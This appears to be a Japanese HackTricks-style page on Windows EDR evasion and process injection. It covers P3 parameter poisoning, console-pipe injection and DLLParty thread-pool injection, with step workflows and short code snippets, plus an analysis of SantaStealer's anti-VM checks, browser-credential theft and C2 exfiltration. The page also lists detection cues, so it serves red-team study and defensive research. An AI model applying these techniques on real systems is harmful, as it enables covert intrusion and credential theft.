- 大規模な implant では、injector のソースコード内でバッファ全体を正しく表現するため、shellcode の埋め込み方法を文字列リテラルから **バイト配列／波括弧付き初期化子** に変更する必要があることが多い。

検出のアイデア
- よく使われる private な RWX/RX 割り当てではなく、**イメージバックの実行可能ページ**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上のバイト列がディスク上のバックアップファイルと一致しなくなっている export のエントリポイント。
- 先頭バイトが最近変更された正規 DLL export の内部から実行を開始するリモートスレッドやコンテキストのピボット。
- DLL の `.text` ページに対する不審な `VirtualProtect(Ex)`／`WriteProcessMemory` の呼び出しに続くスレッド作成。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来のリモート書き込み経路（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **プロセスインジェクション／EDR 回避** 技法である。すでに実行中の対象プロセスにバイト列をコピーするのではなく、Windows が `CreateProcessW` の起動パラメータの一部を子プロセスにコピーし、`PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に格納する仕組みを悪用する。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` によってコピーされる、汚染可能なキャリア

有用なキャリアは次のとおり。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` を指定）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

キャリアに関する実用上の制約：

- `lpCommandLine` は `CreateProcessW` に渡す際、**書き込み可能なメモリ** を指している必要があり、null 終端文字を含めて最大 **32,767 Unicode 文字** に制限される。
- `lpEnvironment` は `NAME=VALUE\0` 形式の文字列が連続し、追加の `\0` で終端される Unicode 環境ブロックでなければならない。
- `lpReserved` は公式に予約済みのため、`ShellInfo` へのマッピングは、安定した文書化済みの仕様ではなく実装詳細として扱うべきである。

これにより、通常のプロセス作成が **payload 転送プリミティブ** となる。オペレーターは攻撃者が制御する起動データを指定して子プロセスを作成し、Windows にプロセス間コピーを実行させる。

### リモート書き込み API を使わないリモート参照の流れ

子プロセスの作成後、**読み取り専用** のプリミティブを使ってコピーされたバッファを特定する。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモートの `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使う：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限の流れ：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` を使い、選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` からすでに返されたメインスレッドのハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行先を変更する

従来の thread hijacking の手順とは異なり、`SuspendThread` / `ResumeThread` は**不要です**。返されたメインスレッドのハンドルに対して、直接コンテキストを変更できます。

これにより、インジェクションで一般に監視されるいくつかの API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も

### Null byte の制限と staged shellcode

3 つの carrier はすべて**文字列または文字列に似たデータ**であるため、`0x00` を含む raw payload は転送中に切り詰められます。実用的な回避策は、実行時に定数を再構築してから任意の second stage を読み込む、**null-free の first stage** を使うことです。

簡単な方法は、XOR による定数の合成です。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これにより、第1段階は、転送されるパラメーターに null byte を埋め込まずに、stack strings、API 引数、DLL パス、または第2段階の shellcode loader を構築できます。

### 第1段階からのスタックベースの API 呼び出し

第1段階で `LoadLibraryA` などの API を呼び出す必要がある場合、次のようにできます。

- 文字列/バッファーを対象プロセスのスタックに push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出し前に `RSP` を **16-byte 境界にアライン**する

その後、第2段階をスタックから `PAGE_READWRITE` のメモリー領域にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプできます。これにより、直接の RWX 割り当てを回避できます。

### 検知の手掛かり

著者が挙げている、有効なハンティングの手掛かりは次のとおりです。

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって**プロセスパラメーターのページが実行可能になる**
- その保護属性の変更に続いて `SetThreadContext` / `NtSetContextThread` が実行される
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` をリモートから読み取る
- プロセス作成時に、`lpCommandLine`、`lpEnvironment`、または `STARTUPINFO.lpReserved` の値が異常に長い、またはエントロピーが高い

### メモ

- P3 は**プロセス間転送の手法**であり、それ自体は完全な実行プリミティブではありません。コピーされたパラメーターには、実行権限への変更と実行先のリダイレクト方法が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は著者も検討しましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの疑わしいプリミティブを使用するため、採用されませんでした。

**既存の** Windows プロセスにスレッドの説明を通じて payload を送り込み、その後、待機中のスレッドの戻りアドレスをハイジャックする方法については、[Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md) を参照してください。

## Console STDIN pipe injection

対話型コンソールの子プロセスも、**payload 転送プリミティブ**として利用できます。injector は子プロセスの標準入力を pipe にリダイレクトし、marker に続けて shellcode を送信します。コンソールプログラムがデータを自身のプライベートメモリーに読み込んだ後、injector はそのバッファーを見つけ、実行可能にして、子スレッドの実行先をそこへリダイレクトします。この方法では `VirtualAllocEx` と `WriteProcessMemory` を回避できますが、一般的な EDR bypass ではなく、依然として process injection です。<sup>[[41]](#references)</sup>

「named-pipe」という説明にかかわらず、参照実装は `CreatePipe` を呼び出しており、作成するのは**匿名 pipe**です。Windows は匿名 pipe を内部的に一意の名前を持つ pipe オブジェクトとして実装しますが、この PoC は `\\.\pipe\<name>` パスを指定せず、`CreateNamedPipe` も呼び出しません。デフォルトのセキュリティ記述子を使って継承可能なハンドルを作成し、読み取りハンドルを `STARTUPINFO.hStdInput` に設定し、`STARTF_USESTDHANDLES` を指定して、ハンドル継承を有効にした状態で新しい子プロセスを起動します。したがって、この PoC は指定されたコンソール実行ファイルを起動するものであり、既存のプロセスに pipe を接続するものではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参照ワークフロー

この実装は、次の一連の処理を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの `STDIN` と `STDOUT` 用に、匿名 pipe のペアを作成します。親プロセス側の2つのハンドルの継承を無効にし、プロセス作成後に親プロセス内の子プロセス側ハンドルの複製を閉じます。
2. `netsh.exe` や `nslookup.exe` などの対話型実行ファイルを `CREATE_NEW_CONSOLE` で起動します。子プロセスはリダイレクトされた標準ハンドルを継承します。
3. 親プロセス側の `STDIN` ハンドルを通じて、`WriteFile` で `rawData` 配列全体を送信します。コンソールプログラムはバイト列を読み込み、そのコピーを自身のプライベートなコミット済み領域の1つに残します。
4. `VirtualQueryEx` で子プロセスのアドレス空間を走査し、候補となる `MEM_PRIVATE` 領域を `ReadProcessMemory` で読み取り、`rawData` の先頭にある marker を検索します。
5. `VirtualProtectEx` で、見つかったバッファーを `PAGE_EXECUTE_READWRITE` に変更します。
6. メインスレッドを特定して一時停止し、`NtSetContextThread` で `RIP` を `found_address + 0x19` に設定してから、スレッドを再開します。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込まれたpayloadはx64 shellcodeです。`rawData`は25バイトのmarkerで始まるため、実行可能なバイト列は16進数オフセット`0x19`から始まります。payloadを置き換える場合は、このレイアウトを維持するか、marker、search vector、array size、execution offsetをまとめて更新してください。ソースコメントには、`0x0A`、`0x0D`、`0x1A`もbad characterとして記載されています。このワークフローでは、子プロセスのtokenやprivilegesは変更されません。<sup>[[41]](#references)</sup>

小規模なnative helperやpayloadのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## shellcodeを使わないThread-pool callback DLL injection (DLLParty)

DLLPartyはPoolParty形式のthread-pool injectionを応用し、既存のtarget workerに、注入したcallback stubを実行させるのではなく、`LoadLibraryA`を呼び出させます。dispatch primitiveとして、target poolのI/O completion portにキューイングされた`TP_DIRECT` completionを使用します。これはprocess permissionsを回避するものではありません。PoCは`OpenProcess(PROCESS_ALL_ACCESS)`を呼び出し、読み書き可能なtarget memoryと、複製可能なworker-factoryおよびcompletion-port handlesを必要とします。<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64では、workerはstack上の`TP_CALLBACK_INSTANCE`へのポインターを`RCX`に渡します。これは最初のcallback argumentです。`LoadLibraryA`は同じポインターを`LPCSTR`として解釈します。テストした経路では、`TppWorkerThread`は`RSP+0x178`にポインターを構築し、そのオブジェクトへの最初の通常の書き込みは`RSP+0x1d0`で行われます。そのため、この0x58バイトの先頭領域に収まるnull終端DLL pathは、dispatch前に上書きされることなく、instanceの先頭に配置できます。これは特定のbuildで確認されたものであり、文書化されたWindows ABIの保証ではありません。<sup>[[46]](#references)[[47]](#references)</sup>

参照実装のワークフローは次のとおりです。<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)`でtargetのhandlesを列挙し、object typesを照会して`TpWorkerFactory`を特定します。worker-factory handleを複製し、`WorkerFactoryBasicInformation`を照会します。`StartParameter`からremote `TP_POOL`が得られます。`TotalWorkerCount == 0`のfactoryはスキップします。
2. `TP_POOL.CompletionPort`を読み取り、poolのprivate worker listをたどります。テストしたWindows 10 19045 x64 build（`ntdll.dll 10.0.19041.4842`）では、headは`pool+0x60`にあり、各linkは`worker+0x10`にあります。そのため、callback-instance slotは`worker+0x38`、すなわち`link+0x28`です。PoCは、ポインターのalignment、linkの相互参照、poolの所有関係、ゼロではないthread IDs、重複node、list headの安定性を検証します。
3. キューイングされたcompletionはどのworkerでも処理される可能性があるため、見つかった**すべての**worker slotにDLL pathを書き込みます。書き込み可能なtarget memoryに`Callback = LoadLibraryA`の`TP_DIRECT`を配置します。PoCは`VirtualAllocEx`の代わりに、worker stack上の`last_slot-0x500`を使います。このoffsetは実験的なものであり、アクティブなstack dataと衝突しないようにする必要があります。
4. targetのcompletion-port handleを複製し、`ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`を呼び出します。remote `TP_DIRECT`のアドレスがcompletion keyになります。既存のworkerが、上書きされたcallback-instance pointerを使って`LoadLibraryA`を呼び出し、targetからアクセス可能なDLLをロードします。

PoCはtarget PID（`DLLParty.exe <target_pid>`）を受け取り、`DLLParty.cpp`にハードコードされたDLL pathを使用します。x64 executableをbuildする前に、targetからアクセス可能なpathを設定してください。また、自プロセスの`LoadLibraryA`アドレスをremote callbackとして使うため、そのアドレスがtargetでも有効であることを前提としています。コードはpathの長さが0x58バイトの領域に収まるか、workerの走査でslotが見つかってから最後の要素を参照しているかを確認しません。target buildに合わせて、private offset、stack layout、書き込み可能領域を再検証してください。`CreateRemoteThreadEx`、shellcode、`VirtualAllocEx`を使わなくても、プロセス間の書き込みやDLLロードのtelemetryはなくなりません。<sup>[[46]](#references)[[47]](#references)</sup>

## ファイルレス回避と認証情報窃取のためのSantaStealerの手法

SantaStealer（別名BluelineStealer）は、現代のinfo-stealerがAV bypass、anti-analysis、credential accessをひとつのワークフローに組み込む方法を示しています。<sup>[[24]](#references)</sup>

### Keyboard layoutによる判定とsandbox遅延

- config flag（`anti_cis`）は`GetKeyboardLayoutList`でインストール済みのkeyboard layoutを列挙します。キリル文字のlayoutが見つかると、サンプルは空の`CIS` markerを作成して終了します。これにより、対象外のlocaleでは実行されず、調査用の痕跡だけが残ります。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層の `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前を独自の rolling checksum でハッシュ化して、デバッガー／sandbox の埋め込みブロックリストと照合する。コンピューター名にも同じチェックサムを適用し、`C:\analysis` などの作業ディレクトリも確認する。
- Variant B はシステムプロパティ（プロセス数の下限、最近の稼働時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、sleep の前後でタイミングチェックを行って single-stepping の兆候を探す。いずれかに該当すると、モジュールの起動前に処理を中止する。

### Fileless helper + 二重 ChaCha20 reflective loading

- メインの DLL/EXE には Chromium credential helper が埋め込まれており、ディスクにドロップするか、メモリに手動マッピングする。fileless モードでは、helper の成果物を書き込まずに import／relocation を自力で解決する。
- この helper は、第2段階の DLL を ChaCha20 で2回暗号化して保存する（32バイトの鍵2つと12バイトの nonce）。2回の復号後、blob を reflectively load（`LoadLibrary` は使用しない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export を呼び出す。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは direct-syscall reflective process hollowing を使って実行中の Chromium browser に inject し、AppBound Encryption keys を継承して、ABE の強化にもかかわらず SQLite database から passwords/cookies/credit cards を直接 decrypt する。

### モジュール式の in-memory 収集と分割 HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` function-pointer table を反復処理し、有効なモジュール（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとに1つの thread を起動する。各 thread は共有バッファーに結果を書き込み、約45秒の join window 後にファイル数を報告する。
- 完了後、静的リンクされた `miniz` library を使ってすべてを `%TEMP%\\Log.zip` に zip する。次に `ThreadPayload1` は15秒 sleep し、archive を10 MBずつ HTTP POST で `http://<C2>:6767/upload` に送信する。browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装する。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` を付加し、最後の chunk には `complete: true` を追加して、C2 に再構成の完了を知らせる。

## References

- [1] [高度な回避技術：精密な Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ブログ](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – malware に対する call stack の特別扱いはもう終わり](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – ドキュメント](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – サンプル](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – サンプル](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 自分の zero trust を信頼すべきか？Zscaler の posture checks を回避する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去の ransomware 活動を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：forwarded exports の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library の検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – プロセスのセキュリティとアクセス権](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU リファレンス (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) を活用した EDR 対策](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique で Windows Defender の保護シェルを破る](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink コマンドのリファレンス](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – 純粋な幕の向こう側：RAT から Builder、そして Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer が街にやってくる：新たな野心的 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API Tracing で Node.js malware を無力化する](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW の隠蔽](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations での Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を Kernel Operation Primitive として weaponize する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った自己マスキング関数の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - リダイレクトされた入力と出力を使用した子プロセスの作成](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy：WasmForge で C# ツールを再構築する](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET Projects のコンパイル](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcodeless DLL injection のための thread pool internals の悪用](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 を使用した red team implant の評価](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning ベースの検知を回避する](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML ベースの .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
